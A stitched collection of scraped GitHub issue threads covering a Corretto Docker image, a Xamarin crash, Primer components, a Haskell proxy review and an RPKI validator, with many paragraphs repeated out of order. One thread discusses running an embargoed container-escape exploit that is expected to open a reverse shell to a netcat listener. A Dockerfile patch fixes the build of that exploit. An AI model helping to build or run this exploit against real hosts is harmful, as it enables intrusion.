When 11.0.3 becomes available today, we should also update it here. For our java services running in k8s we are using the following ``preStop`` hook:
```
lifecycle:
   preStop:
     exec:
       command: ["/bin/bash", "-c", "PID=`pidof java` && kill -SIGTERM $PID && while ps -p $PID > /dev/null; do sleep 1; done;"]
```
However, both ``pidof`` and ``ps`` executables are missing in the official Docker image. From the support documentation( https://aws.amazon.com/corretto/faqs/#support ) it is evident that 'Updates are planned to be released quarterly. Amazon also plans to apply urgent fixes (including security) outside of the regular quarterly cycle when they are available and ready to use.'

If we raise an issue on github , will a build be released with the fixes in between the regular quarterly updates?  When using this for microservices it would be helpful to have a minimal distribution. The size of version 11.0.3 is 492MB. Amazon Linux is 162MB of this. It seems that other supported linux distributions have a smaller minimal package like Ubuntu which I believe goes somewhere between 30 and 40MB. Alpine would be nice but I do not see it as one of the listed supported distribution for the JDK.

In addition, I think it would make sense to remove all the development tools from the image like javadoc, jdep,...

Additionally, it would make sense to remove modules that are only used by clients like java.desktop as I do not see this as a use case for a docker container.  For our java services running in k8s we are using the following ``preStop`` hook:
```
lifecycle:
   preStop:
     exec:
       command: ["/bin/bash", "-c", "PID=`pidof java` && kill -SIGTERM $PID && while ps -p $PID > /dev/null; do sleep 1; done;"]
```
However, both ``pidof`` and ``ps`` executables are missing in the official Docker image. I have created a PR and added the missing packages. If there is a more "lightweight" way of achieving the same, let me know. Thanks :) When 11.0.3 becomes available today, we should also update it here. Upload initial Docker image with OpenJDK 11 In [corretto-8-docker#24](https://github.com/corretto/corretto-8-docker/pull/24) @smelchior registered the locale as UTF8, which we used here.

While testing this image in preparation for uploading to docker hub, I found that fontconfig in AL2 doesn't recognize `C.utf8` (here's the issue with AL2: [#26](https://github.com/aws/amazon-linux-docker-images/issues/26)) 

My intuition is to remove `ENV LANG C.utf8` from our Dockerfile until the fontconfig issue is resolved. Thoughts? Upload initial Docker image with OpenJDK 11 From the support documentation( https://aws.amazon.com/corretto/faqs/#support ) it is evident that 'Updates are planned to be released quarterly. Amazon also plans to apply urgent fixes (including security) outside of the regular quarterly cycle when they are available and ready to use.'

If we raise an issue on github , will a build be released with the fixes in between the regular quarterly updates?  In [corretto-8-docker#24](https://github.com/corretto/corretto-8-docker/pull/24) @smelchior registered the locale as UTF8, which we used here.

While testing this image in preparation for uploading to docker hub, I found that fontconfig in AL2 doesn't recognize `C.utf8` (here's the issue with AL2: [#26](https://github.com/aws/amazon-linux-docker-images/issues/26)) 

My intuition is to remove `ENV LANG C.utf8` from our Dockerfile until the fontconfig issue is resolved. Thoughts?
<---------->
170235078
[I've posted the embargoed exploit code on oss-security.](https://www.openwall.com/lists/oss-security/2019/02/13/3) Did you want to include that in this project? [I've posted the embargoed exploit code on oss-security.](https://www.openwall.com/lists/oss-security/2019/02/13/3) Did you want to include that in this project? Trying to understand the attack surface.  The details in the announcement on OpenWall indicate Linux was tested and vulnerable.  Anyone know or test to see if Docker on Windows is affected? I am testing your code on CentOS 7.6 with a Docker pull of Debain latest and this exploit does not seem to work after entering the host in payload, make, and run exploit + payload. I see on the container in /tmp running pwn.sh "Starting exploit" but no reverse shell back to NC on the guest OS. Trying to understand the attack surface.  The details in the announcement on OpenWall indicate Linux was tested and vulnerable.  Anyone know or test to see if Docker on Windows is affected? need to be root on container?
<---------->
170332977
The login button scaling is limioted by the left and right margins/paddings it seems and does not scale well on Android. The rounded corners disappear and reappear when tapping.

(The heart icon does scale correctly) Hello,

I have tried to show shake animation with content page in Xamarin Form,
Any way it got some error:
dableProperty property, System.Object value, Xamarin.Forms.Internals.SetValueFlags attributes, Xamarin.Forms.BindableObject+SetValuePrivateFlags privateAttributes) [0x00173] in D:\a\1\s\Xamarin.Forms.Core\BindableObject.cs:379 
  at Xamarin.Forms.BindableObject.SetValue (Xamarin.Forms.BindableProperty property, System.Object value, System.Boolean fromStyle, System.Boolean checkAccess) [0x00042] in D:\a\1\s\Xamarin.Forms.Core\BindableObject.cs:316 
  at Xamarin.Forms.BindableObject.SetValue (Xamarin.Forms.BindableProperty property, System.Object value) [0x00000] in D:\a\1\s\Xamarin.Forms.Core\BindableObject.cs:293 
  at Xamarin.Forms.MasterDetailPage.set_IsPresented (System.Boolean value) [0x00000] in D:\a\1\s\Xamarin.Forms.Core\MasterDetailPage.cs:60 
  at Xamarin.Forms.Platform.iOS.NavigationRenderer+<>c__DisplayClass76_0.<SetMasterLeftBarButton>g__OnItemTapped|1 (System.Object sender, System.EventArgs e) [0x00000] in D:\a\1\s\Xamarin.Forms.Platform.iOS\Renderers\N
avigationRenderer.cs:776 
  at UIKit.UIBarButtonItem+Callback.Call (Foundation.NSObject sender) [0x0000d] in /Library/Frameworks/Xamarin.iOS.framework/Versions/12.2.1.16/src/Xamarin.iOS/UIKit/UIBarButtonItem.cs:30 
--- End of stack trace from previous location where exception was thrown ---
  at (wrapper managed-to-native) UIKit.UIApplication.UIApplicationMain(int,string[],intptr,intptr)
  at UIKit.UIApplication.Main (System.String[] args, System.IntPtr principal, System.IntPtr delegate) [0x00005] in /Library/Frameworks/Xamarin.iOS.framework/Versions/12.2.1.16/src/Xamarin.iOS/UIKit/UIApplication.cs:79 
  at UIKit.UIApplication.Main (System.String[] args, System.String principalClassName, System.String delegateClassName) [0x0002c] in /Library/Frameworks/Xamarin.iOS.framework/Versions/12.2.1.16/src/Xamarin.iOS/UIKit/UIApplication.cs:63 
  at CABMOBILE.iOS.Application.Main (System.String[] args) [0x00001] in D:\Project\CAB\Mobile Banking\CABMOBILE\CABMOBILE\CABMOBILE.iOS\Main.cs:17
2019-10-17 00:20:29.480577-070
0 CABMOBILE.iOS[12406:142385] critical: Stacktrace:
2019-10-17 00:20:29.480760-0700 CABMOBILE.iOS[12406:142385] critical: 
Native stacktrace:
2019-10-17 00:20:29.489705-0700 CABMOBILE.iOS[12406:142385] critical: 	0   CABMOBILE.iOS                       0x0000000109ca9f94 mono_handle_native_crash + 244
2019-10-17 00:20:29.490090-0700 CABMOBILE.iOS[12406:142385] critical: 	1   libsystem_platform.dylib            0x000000011a926b3d _sigtramp + 29
2019-10-17 00:20:29.490271-0700 CABMOBILE.iOS[12406:142385] critical: 	2   ???                                 0x000000010a93652c 0x0 + 4472399148
2019-10-17 00:20:29.490433-0700 CABMOBILE.iOS[12406:142385] critical: 	3   libsystem_c.dylib                   0x000000011a6a9c45 abort + 127
2019-10-17 00:20:29.490591-0700 CABMOBILE.iOS[12406:142385] critical: 	4   CABMOBILE.iOS                       0x0000000109ec682f xamarin_unhandled_exception_handler + 47
2019-10-17 00:20:29.490746-0700 CABMOBILE.iOS[12406:142385] critical: 	5   CABMOBILE.iOS                       0x0000000109d4744e mono_invoke_unhandled_exception_hook + 158
2019-10-17 00:20:29.490950-0700 CABMOBILE.iOS[12406:142385] critical: 	6   CABMOBILE.
iOS                       0x0000000109ca993c mono_handle_exception_internal + 6140
2019-10-17 00:20:29.491102-0700 CABMOBILE.iOS[12406:142385] critical: 	7   CABMOBILE.iOS                       0x0000000109ca8139 mono_handle_exception + 25
2019-10-17 00:20:29.491429-0700 CABMOBILE.iOS[12406:142385] critical: 	8   CABMOBILE.iOS                       0x0000000109c28603 mono_amd64_throw_exception + 131
2019-10-17 00:20:29.493006-0700 CABMOBILE.iOS[12406:142385] critical: 	9   ???                                 0x00000001397ae5a7 0x0 + 5259322791
2019-10-17 00:20:29.493269-0700 CABMOBILE.iOS[12406:142385] critical: 	10  CABMOBILE.iOS                       0x0000000109b8803d _ZL32native_to_managed_trampoline_178P11objc_objectP13objc_selectorPP11_MonoMethodP8NSObjectj + 461
2019-10-17 00:20:29.493540-0700 CABMOBILE.iOS[12406:142385] critical: 	11  CABMOBILE.iOS                       0x0000000109b87e68 -[UIKit_UIBarButtonItem_Callback InvokeAction:] + 56
2019-10-17 00:20:29.493752-0700 CABMOBILE.iOS[12406:142385] critical: 	12  UIKitCore                           0x0000000122de1ecb -[UIApplication sendAction:to:from:forEvent:] + 83
2019-10-17 00:20:29.494056-0700 CABMOBILE.iOS[12406:142385] critical: 	13  UIKitCore                           0x000000012252295b __45-[_UIButtonBarTargetAction _invoke:forEvent:]_block_invoke + 154
2019-10-17 00:20:29.494369-0700 CABMOBILE.iOS[12406:142385] critical: 	14  UIKitCore
                           0x0000000122522894 -[_UIButtonBarTargetAction _invoke:forEvent:] + 152
2019-10-17 00:20:29.494662-0700 CABMOBILE.iOS[12406:142385] critical: 	15  UIKitCore                           0x0000000122de1ecb -[UIApplication sendAction:to:from:forEvent:] + 83
2019-10-17 00:20:29.494984-0700 CABMOBILE.iOS[12406:142385] critical: 	16  UIKitCore                           0x000000012281d0bd -[UIControl sendAction:to:forEvent:] + 67
2019-10-17 00:20:29.495367-0700 CABMOBILE.iOS[12406:142385] critical: 	17  UIKitCore                           0x000000012281d3da -[UIControl _sendActionsForEvents:withEvent:] + 450
2019-10-17 00:20:29.495934-0700 CABMOBILE.iOS[12406:142385] critical: 	18  UIKitCore                           0x000000012281c31e -[UIControl touchesEnded:withEvent:] + 583
2019-10-17 00:20:29.496823-0700 CABMOBILE.iOS[12406:142385] critical: 	19  UIKitCore                           0x0000000122e1d0a4 -[UIWindow _sendTouchesForEvent:] + 2729
2019-10-17 00:20:29.497133-0700 CABMOBILE.iOS[12406:142385] critical: 	20  UIKitCore                           0x0000000122e1e7a0 -[UIWindow sendEvent:] + 4080
2019-10-17 00:20:29.497303-0700 CABMOBILE.iOS[12406:142385] critical: 	21  UIKitCore                           0x0000000122dfc394 -[UIApplication sendEvent:] + 352
2019-10-17 00:20:29.497835-0700 CABMOBILE.iOS[12406:142385] critical: 	22  UIKitCore                           0x0000000122ed15a9 __dispatchPreprocessedEventFromEventQueue + 3054
2019-10-17 00:20:29.499048-0700 CABMOBILE.iOS[12406:142385] critical: 	23  UIKitCore                           0x0000000122ed41cb __handleEventQueueInternal + 5948
2019-10-17 00:20:29.499311-0700 CABMOBILE.iOS[12406:142385] critical: 	24  CoreFoundation                      0x00000001182ae721 __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ + 17
2019-10-17 00:20:29.499493-0700 CABMOBILE.iOS[12406:142385] critical: 	25  CoreFoundation                      0x00000001182adf93 __CFRunLoopDoSources0 + 243
2019-10-17 00:20:29.499658-0700 CABMOBILE.iOS[12406:142385] critical: 	26  CoreFoundation                      0x00000001182a863f __CFRunLoopRun + 1263
2019-10-17 00:20:29.499831-0700 CABMOBILE.iOS[12406:142385] critical: 	27  CoreFoundation                      0x00000001182a7e11 CFRunLoopRunSpecific + 625
2019-10-17 00:20:29.499999-0700 CABMOBILE.iOS[12406:142385] critical: 	28  GraphicsServices                    0x000000011e59e1dd GSEventRunModal + 62
2019-10-17 00:20:29.500161-0700 CABMOBILE.iOS[12
406:142385] critical: 	29  UIKitCore                           0x0000000122de081d UIApplicationMain + 140
2019-10-17 00:20:29.500387-0700 CABMOBILE.iOS[12406:142385] critical: 	30  ???                                 0x000000013da391ee 0x0 + 5329097198
2019-10-17 00:20:29.500710-0700 CABMOBILE.iOS[12406:142385] critical: 	31  ???                                 0x000000013da38f83 0x0 + 5329096579
2019-10-17 00:20:29.501073-0700 CABMOBILE.iOS[12406:142385] critical: 
=================================================================
Got a SIGABRT while executing native code. This usually indicates
a fatal error in the mono runtime or one of the native libraries 
used by your application.
=================================================================
The app has been terminated.

Do you have any solution please let me know.

Thanks When entering text in teh entry, the animation for the entry does not kick in when trying to leave the entry or when confiming the input.

(The switch does work correctly)
<---------->
170398859
 There has been an update to `libseccomp` and the image build fails, since it expects to find version 2.3.1.

The following patch installs the expected version via `apt-get`:

    sed -i 's/\(apt-get.*libseccomp\)/\1=2.3.1-2.1ubuntu4/' Dockerfile

```diff
diff --git a/Dockerfile b/Dockerfile
index e703898..cc13471 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -5,8 +5,8 @@ RUN set -e -x ;\
     apt -y update ;\
     apt-get -y install build-essential ;\
     cd /root ;\
-    apt-get -y build-dep libseccomp ;\
-    apt-get source libseccomp
+    apt-get -y build-dep libseccomp=2.3.1-2.1ubuntu4 ;\
+    apt-get source libseccomp=2.3.1-2.1ubuntu4
 
 ADD stage1.c /root/stage1.c
 
```
<---------->
170502885
The solution (I think) is to select/retrieve the values of the `textarea` elements, here:

https://github.com/scottwarren/basicModal/blob/master/src/scripts/main.js#L119-L120
<---------->
170554183
If/when a vertical scrollbar is visible in macOS, it runs over the last item in the header, as seen on [primer.style/css](https://primer.style/css):

![image](https://user-images.githubusercontent.com/113896/58040439-62cc4180-7aea-11e9-96a4-1c3f9f1356cb.png)

We might want to just bump up the default right padding a notch. It seems that when using custom elements in code examples, the `class` attribute gets turned into JSX's `classname`.

### Steps to reproduce

1. Add the following code example:
  ```
    ```html
      <custom-element class="btn">Button</custom-element>
    ```
  ```

### Expected markup

```html
<custom-element class="btn">Button</custom-element>
```

### Actual markup

```html
<custom-element classname="btn">Button</custom-element>
``` Following up the discussion in https://github.com/primer/primer.style/pull/131#discussion_r287148397, the header link to `/team` can be removed. A link to the team has been added in the index page (see https://github.com/primer/primer.style/pull/131#discussion_r286136529).

/cc @emplums because https://github.com/primer/primer.style/pull/131#discussion_r287148397.

/cc @broccolini because https://github.com/primer/primer.style/issues/123#issuecomment-493263134. This is a tracking/scoping issue for refactoring the `SideNav` component to be reusable.

Currently the SideNav component is hardcoded to work specifically for the blueprints project docs. I'd like to break it up into several different components to be added to the library. This will require a bit of refactoring to make all the components truly reusable.

### Scope of Work
Separate SideNav into 7 components:

#### SideNav
 - Container component that takes children and nests them in a `Router` with layout styling

#### Section
- Can take a `path` prop and children.
- Will only be rendered in the `SideNav` if the `path` prop matches the current url.
- Children's path will have the parent `Section` path appended to it's path.
- Children provided should ideally be `SectionLink`s
- Renders a NavList if no children are provided, by looking up children of the node the path points too.
- Feels a little too abstracted/magical/doing too many things 🤔 Might be better broken up into two different components? not sure because it is super helpful as is

#### RouteMatch
- Used to conditionally show/not show a chunk of content based on a path. For example, a chunk of `Section` components

#### NavList
- Renders a `<SectionLink>` for each child of the `path`s node. For instance - `<NavList path='support'/>` would render a `<SectionLink>` for each doc in the `pages/support` folder

#### NodeLink
- Takes `href` and children. If children aren't provided then it looks up the `meta.title` for the `href` and uses that for the title of the link.
- Not 100% sold this is necessary. Feels too magic.

#### SectionLink
- Same as `NodeLink`, but it renders bold when it's href matches the current path

#### NavLink
- Same as `NodeLink`, but it renders with black text when it's href matches the current path


### Notes
- I like the functionality that these components provide, but I'm worried they're too tied to the file structure in next.js being perfect - feels sort of rails-esque. I'm currently considering if a different approach might make them more universal for anyone using React but not necessarily using Next.

- Naming could probably be cleaned up a bit. Especially between SectionLink, NodeLink, and NavLink. Do each of these components differentiate based on where they should be used, or how they change when the path matches their href? This issue is to track the remaining components that I'd like to add to Blueprints

### Navigational Components https://github.com/primer/blueprints/issues/7
- [ ] SideNav 
- [ ] Section
- [ ] RouteMatch
- [ ] NavList
- [ ] NodeLink
- [ ] SectionLink
- [ ] NavLink

### Content Components
- [ ] StatusLabel
- [ ] Outline
- [ ] PackageHeader (added already, but needs documentation and further refactoring) In order to build the new Header, we'll need a NavDropdown component.

This component must:
- [ ] Use `<details>` element
- [ ] Open dropdown menu when clicked
- [ ] Close when anything outside of the menu is clicked
- [ ] If another Dropdown is clicked, that Dropdown should open and the previous one should close (maybe use Context for this?)
- [ ] Should be keyboard navigable
- [ ] When Dropdown is opened, focus should go to first element
- [ ] Should have correct aria labels Atom packages, docset, GH local environment, and linting don't map well to our new setup. In the new header, they are nested under a Tools section, but they live in primer.style/css. Should we have a Tools site that hosts the docs for all of these? Tracking issue for responsive header navigation


Search component:
- [ ] Moves to the far left of the header at smaller breakpoints
- [ ] Search results fill up width of screen
- [ ] Turns into icon only at smaller breakpoints

Top Nav:
- [ ] Is hidden in Header component at smaller breakpoints
- [ ] Displays above SideNav at smaller breakpoints
- [ ] Accordian dropdown for menu items  Following up the discussion in https://github.com/primer/primer.style/pull/131#discussion_r287148397, the header link to `/team` can be removed. A link to the team has been added in the index page (see https://github.com/primer/primer.style/pull/131#discussion_r286136529). Serialize a pre-built lunr index 🎉  Tracking issue for responsive header navigation


Search component:
- [ ] Moves to the far left of the header at smaller breakpoints
- [ ] Search results fill up width of screen
- [ ] Turns into icon only at smaller breakpoints

Top Nav:
- [ ] Is hidden in Header component at smaller breakpoints
- [ ] Displays above SideNav at smaller breakpoints
- [ ] Accordian dropdown for menu items Atom packages, docset, GH local environment, and linting don't map well to our new setup. Should we have a Tools site that hosts the docs for all of these? @jhuashao made some really sweet animated versions of header images in (chronologically) https://github.com/primer/design/pull/11, https://github.com/primer/components/pull/413, and primer/css#692. We currently use `next/dynamic` to _only_ render them client-side because the bodymovin package doesn't work server-side, but it would be nice to have the static SVG rendered server-side first so to prevent the flash of missing image (yes, FOMI) when it eventually renders client-side. Maybe an HOC like so?

```jsx
import {createHeaderAnimation} from '@primer/blueprints/components'
import HeaderImage from './HeaderImage'
import animationData from './HeaderImageAnimation.json'

export default createHeaderAnimation(HeaderImage, data)
```

Another benefit of this is that we wouldn't have to add bodymovin as a local dependency for each of our sites, and could keep it up-to-date here. I think SVGR even allows us to override `<svg>` element attributes with props, so our component could add `width="100%" height={null}` to have it scale without us having to modify the SVG file after exporting? In order to build the new Header, we'll need a NavDropdown component.

This component must:
- [ ] Use `<details>` element
- [ ] Open dropdown menu when clicked
- [ ] Close when anything outside of the menu is clicked
- [ ] If another Dropdown is clicked, that Dropdown should open and the previous one should close (maybe use Context for this?)
- [ ] Should be keyboard navigable
- [ ] When Dropdown is opened, focus should go to first element
- [ ] Should have correct aria labels Add an edit link component!  I'd love to get a hero illustration made for the docs site, as this is the only docs site that currently doesn't have one! 

cc @broccolini @ashygee  https://github.com/primer/blueprints/issues/7#issuecomment-469914383 This issue is to track the remaining components that I'd like to add to Blueprints

### Navigational Components
- [ ] SideNav
- [ ] Section
- [ ] RouteMatch
- [ ] NavList
- [ ] NodeLink
- [ ] SectionLink
- [ ] NavLink

### Content Components
- [ ] StatusLabel
- [ ] Outline
- [ ] PackageHeader (added already, but needs documentation and further refactoring) This is a tracking/scoping issue for refactoring the `SideNav` component to be reusable.

Currently the SideNav component is hardcoded to work specifically for the blueprints project docs. I'd like to break it up into several different components to be added to the library. This will require a bit of refactoring to make all the components truly reusable.

### Scope of Work
Separate SideNav into x components:

#### SideNav
 - Container component that takes children and nests them in a `Router` with layout styling

#### Section
- Can take a `path` prop and children.
- Will only be rendered in the `SideNav` if the `path` prop matches the current url.
- Children's path will have the parent `Section` path appended to it's path.

#### RouteMatch
- Used to conditionally show/not show a chunk of content based on a path. For example, a chunk of `Section` components

#### NavList
- Renders a `<SectionLink>` for each child of the `path`s node. For instance - `<NavList path='support'/>` would render a `<SectionLink>` for each doc in the `pages/support` folder

#### NodeLink
- Takes `href` and children. If children aren't provided then it looks up the `meta.title` for the `href` and uses that for the title of the link.
- Not 100% sold this is necessary. Feels too magic.

#### SectionLink
- Same as `NodeLink`, but it renders bold when it's href matches the current path

#### NavLink
- Same as `NodeLink`, but it renders with black text when it's href matches the current path

<---------->
170613595
* [ ] **Command parsing**

https://github.com/restaumatic/vcr-proxy/blob/125154506e36495b1521d2a36b5354d18c3f8789/src/Network/VCR.hs#L29

Several notes:
* I'd go for `optparse-applicative` instead manual pattern matching.
* `endpoint` argument is not used for replaying at all, confusing

* [ ] **Pokemon exception handling?**
https://github.com/restaumatic/vcr-proxy/blob/125154506e36495b1521d2a36b5354d18c3f8789/src/Network/VCR.hs#L46
Maybe at least print exception to the console?

* [ ] **Use 502 as default error handler (minor)**
https://github.com/restaumatic/vcr-proxy/blob/125154506e36495b1521d2a36b5354d18c3f8789/src/Network/VCR.hs#L51
https://github.com/restaumatic/vcr-proxy/blob/125154506e36495b1521d2a36b5354d18c3f8789/src/Network/VCR/Middleware.hs#L86

* [ ] **Endpoint not stored in the casette**
https://github.com/restaumatic/vcr-proxy/blob/125154506e36495b1521d2a36b5354d18c3f8789/src/Network/VCR/Types.hs#L39
I'd add it for future reference.

* [ ] **UTF-8 handling**
Not sure if this will be a problem in practice, but AFARI there is no standard that tells that urls have to be UTF-8 encoded. Perhaps we should operate on ByteStrings?
https://github.com/restaumatic/vcr-proxy/blob/125154506e36495b1521d2a36b5354d18c3f8789/src/Network/VCR/Middleware.hs#L104
<---------->
170715385
Per https://github.com/NLnetLabs/krill/issues/125  On running the tool for the first time, users are presented with a number of red "error" logs that are not really errors, such as:

```
INFO[0000] Validator started
ERRO[0000] open rrdp.json: no such file or directory
ERRO[0000] Error exploring file: open cache/rpki.afrinic.net/repository/AfriNIC.cer: no such file or directory
ERRO[0000] Error exploring file: open cache/rpki.apnic.net/repository/apnic-rpki-root-iana-origin.cer: no such file or directory
ERRO[0000] Error exploring file: open cache/rpki.arin.net/repository/arin-rpki-ta.cer: no such file or directory
ERRO[0000] Error exploring file: open cache/repository.lacnic.net/rpki/lacnic/rta-lacnic-rpki.cer: no such file or directory
ERRO[0000] Error exploring file: open cache/rpki.ripe.net/ta/ripe-ncc-ta.cer: no such file or directory
INFO[0000] Still exploring. Revalidating now
INFO[0000] Rsync sync rsync://rpki.arin.net/repository/arin-rpki-ta.cer
INFO[0001] Rsync sync rsync://rpki.ripe.net/ta/ripe-ncc-ta.cer
INFO[0002] Rsync sync rsync://rpki.afrinic.net/repository/AfriNIC.cer
INFO[0004] Rsync sync rsync://rpki.apnic.net/repository/apnic-rpki-root-iana-origin.cer
INFO[0007] Rsync sync rsync://repository.lacnic.net/rpki/lacnic/rta-lacnic-rpki.cer
ERRO[0010] Error exploring file: open cache/rpki.afrinic.net/repository/04E8B0D80F4D11E0B657D8931367AE7D/62gPOPXWxxu0sQa4vQZYUBLaMbY.mft: no such file or directory
ERRO[0010] Error exploring file: open cache/rpki.apnic.net/repository/838DB214166511E2B3BC286172FD1FF2/C5zKkN0Neoo3ZmsZIX_g2EA3t6I.mft: no such file or directory
ERRO[0010] Error exploring file: open cache/rpki.arin.net/repository/arin-rpki-ta/arin-rpki-ta.mft: no such file or directory
ERRO[0010] Error exploring file: open cache/repository.lacnic.net/rpki/lacnic/rta-lacnic-rpki.mft: no such file or directory
ERRO[0010] Error exploring file: open cache/rpki.ripe.net/repository/ripe-ncc-ta.mft: no such file or directory
INFO[0010] Still exploring. Revalidating now
```
As these files haven't been created yet (it's the first run) these really ought to be "info" priority, or "warning" at most. An error generally means something that is causing functionality to stop due to an unexpected issue that may not be able to be recovered from.

Would you consider changing these to a lower priority, and/or to change the message so that it indicates this is a recoverable state to be in? On running the tool for the first time, users are presented with a number of red "error" logs that are not really errors, such as:

```
INFO[0000] Validator started
ERRO[0000] open rrdp.json: no such file or directory
ERRO[0000] Error exploring file: open cache/rpki.afrinic.net/repository/AfriNIC.cer: no such file or directory
ERRO[0000] Error exploring file: open cache/rpki.apnic.net/repository/apnic-rpki-root-iana-origin.cer: no such file or directory
ERRO[0000] Error exploring file: open cache/rpki.arin.net/repository/arin-rpki-ta.cer: no such file or directory
ERRO[0000] Error exploring file: open cache/repository.lacnic.net/rpki/lacnic/rta-lacnic-rpki.cer: no such file or directory
ERRO[0000] Error exploring file: open cache/rpki.ripe.net/ta/ripe-ncc-ta.cer: no such file or directory
INFO[0000] Still exploring. Revalidating now
INFO[0000] Rsync sync rsync://rpki.arin.net/repository/arin-rpki-ta.cer
INFO[0001] Rsync sync rsync://rpki.ripe.net/ta/ripe-ncc-ta.cer
INFO[0002] Rsync sync rsync://rpki.afrinic.net/repository/AfriNIC.cer
INFO[0004] Rsync sync rsync://rpki.apnic.net/repository/apnic-rpki-root-iana-origin.cer
INFO[0007] Rsync sync rsync://repository.lacnic.net/rpki/lacnic/rta-lacnic-rpki.cer
ERRO[0010] Error exploring file: open cache/rpki.afrinic.net/repository/04E8B0D80F4D11E0B657D8931367AE7D/62gPOPXWxxu0sQa4vQZYUBLaMbY.mft: no such file or directory
ERRO[0010] Error exploring file: open cache/rpki.apnic.net/repository/838DB214166511E2B3BC286172FD1FF2/C5zKkN0Neoo3ZmsZIX_g2EA3t6I.mft: no such file or directory
ERRO[0010] Error exploring file: open cache/rpki.arin.net/repository/arin-rpki-ta/arin-rpki-ta.mft: no such file or directory
ERRO[0010] Error exploring file: open cache/repository.lacnic.net/rpki/lacnic/rta-lacnic-rpki.mft: no such file or directory
ERRO[0010] Error exploring file: open cache/rpki.ripe.net/repository/ripe-ncc-ta.mft: no such file or directory
INFO[0010] Still exploring. Revalidating now
```
As these files haven't been created yet (it's the first run) these really ought to be "info" priority, or "warning" at most. An error generally means something that is causing functionality to stop due to an unexpected issue that may not be able to be recovered from.

Would you consider changing these to a lower priority, and/or to change the message so that it indicates this is a recoverable state to be in? Hi,

Is there a possibility to customise/override specific ROAs with mechanisms such as:

* Ignore filters
You can use filters to exclude ROAs matching an ASN and/or prefix

* Whitelist
By adding a whitelist entry you can manually authorise an ASN to originate a prefix in addition to the validated ROAs from the repository.

? Hi,

Is there a possibility to customise/override specific ROAs with mechanisms such as:

* Ignore filters
You can use filters to exclude ROAs matching an ASN and/or prefix

* Whitelist
By adding a whitelist entry you can manually authorise an ASN to originate a prefix in addition to the validated ROAs from the repository.

? When trying to run octorpki, it looks like it is choking on this file:

[wu2-b8OX-KCC5qOjm3zOTSWbziE.cer.gz](https://github.com/cloudflare/cfrpki/files/3497942/wu2-b8OX-KCC5qOjm3zOTSWbziE.cer.gz)

```
ERRO[0002] Error adding Resource wu2-b8OX-KCC5qOjm3zOTSWbziE.cer: c2edbe6fc397f8a082e6a3a39b7cce4d259bce21 contains invalid IP addresses: [Min: 45.253.244.0 max: 45.253.255.255 61.29.240.0/20]
```

openssl shows:

```
% openssl x509 -inform DER -text -in ./cache/rpki.cnnic.cn/rpki/A9162E3D0000/wu2-b8OX-KCC5qOjm3zOTSWbziE.cer -noout
            sbgp-ipAddrBlock: critical
                IPv4:
                  45.253.244.0-45.253.255.255
                  61.29.240.0/20
                  103.64.24.0-103.64.127.255
                  103.64.140.0-103.64.147.255
``` When trying to run octorpki, it looks like it is choking on this file:

[wu2-b8OX-KCC5qOjm3zOTSWbziE.cer.gz](https://github.com/cloudflare/cfrpki/files/3497942/wu2-b8OX-KCC5qOjm3zOTSWbziE.cer.gz)

```
ERRO[0002] Error adding Resource wu2-b8OX-KCC5qOjm3zOTSWbziE.cer: c2edbe6fc397f8a082e6a3a39b7cce4d259bce21 contains invalid IP addresses: [Min: 45.253.244.0 max: 45.253.255.255 61.29.240.0/20]
```

openssl shows:

```
% openssl x509 -inform DER -text -in ./cache/rpki.cnnic.cn/rpki/A9162E3D0000/wu2-b8OX-KCC5qOjm3zOTSWbziE.cer -noout
            sbgp-ipAddrBlock: critical
                IPv4:
                  45.253.244.0-45.253.255.255
                  61.29.240.0/20
                  103.64.24.0-103.64.127.255
                  103.64.140.0-103.64.147.255
``` I launch container w/ mounted volume to `/tals` but failed to fetch data from RIR.
Logging shown as following.

```
time="2019-07-14T17:00:26+07:00" level=info msg="Validator started"
time="2019-07-14T17:00:26+07:00" level=info msg="Serving HTTP on :8080/output.json"
time="2019-07-14T17:00:26+07:00" level=info msg="Got open tals/afrinic.tal: no such file or directory but repository not yet synchronized"
time="2019-07-14T17:00:26+07:00" level=info msg="Got open tals/apnic.tal: no such file or directory but repository not yet synchronized"
time="2019-07-14T17:00:26+07:00" level=info msg="Got open tals/arin.tal: no such file or directory but repository not yet synchronized"
time="2019-07-14T17:00:26+07:00" level=info msg="Got open tals/lacnic.tal: no such file or directory but repository not yet synchronized"
time="2019-07-14T17:00:26+07:00" level=info msg="Got open tals/ripe.tal: no such file or directory but repository not yet synchronized"
time="2019-07-14T17:00:26+07:00" level=info msg="Stable state. Revalidating in 20m0s"
```

I found that `/tals/*.tal` files are missing.

Please add `VOLUME [ "/tals" ]` in to `Dockerfile` and `Dockerfile.prod`  /tals are not included because gitignored (my fault) When trying to run octorpki, it looks like it is choking on this file:

[wu2-b8OX-KCC5qOjm3zOTSWbziE.cer.gz](https://github.com/cloudflare/cfrpki/files/3497942/wu2-b8OX-KCC5qOjm3zOTSWbziE.cer.gz)

```
ERRO[0002] Error adding Resource wu2-b8OX-KCC5qOjm3zOTSWbziE.cer: c2edbe6fc397f8a082e6a3a39b7cce4d259bce21 contains invalid IP addresses: [Min: 45.253.244.0 max: 45.253.255.255 61.29.240.0/20]
```

openssl shows:

```
% openssl x509 -inform DER -text -in ./cache/rpki.cnnic.cn/rpki/A9162E3D0000/wu2-b8OX-KCC5qOjm3zOTSWbziE.cer -noout
            sbgp-ipAddrBlock: critical
                IPv4:
                  45.253.244.0-45.253.255.255
                  61.29.240.0/20
                  103.64.24.0-103.64.127.255
                  103.64.140.0-103.64.147.255
``` When trying to run octorpki, it looks like it is choking on this file:

[wu2-b8OX-KCC5qOjm3zOTSWbziE.cer.gz](https://github.com/cloudflare/cfrpki/files/3497942/wu2-b8OX-KCC5qOjm3zOTSWbziE.cer.gz)

```
ERRO[0002] Error adding Resource wu2-b8OX-KCC5qOjm3zOTSWbziE.cer: c2edbe6fc397f8a082e6a3a39b7cce4d259bce21 contains invalid IP addresses: [Min: 45.253.244.0 max: 45.253.255.255 61.29.240.0/20]
```

openssl shows:

```
% openssl x509 -inform DER -text -in ./cache/rpki.cnnic.cn/rpki/A9162E3D0000/wu2-b8OX-KCC5qOjm3zOTSWbziE.cer -noout
            sbgp-ipAddrBlock: critical
                IPv4:
                  45.253.244.0-45.253.255.255
                  61.29.240.0/20
                  103.64.24.0-103.64.127.255
                  103.64.140.0-103.64.147.255
``` ```
$ octorpki -tal.name APNICRPKIWorkshop -tal.root workshoptal/workshop.tal
INFO[0000] Validator started
INFO[0000] Serving HTTP on :8080/output.json
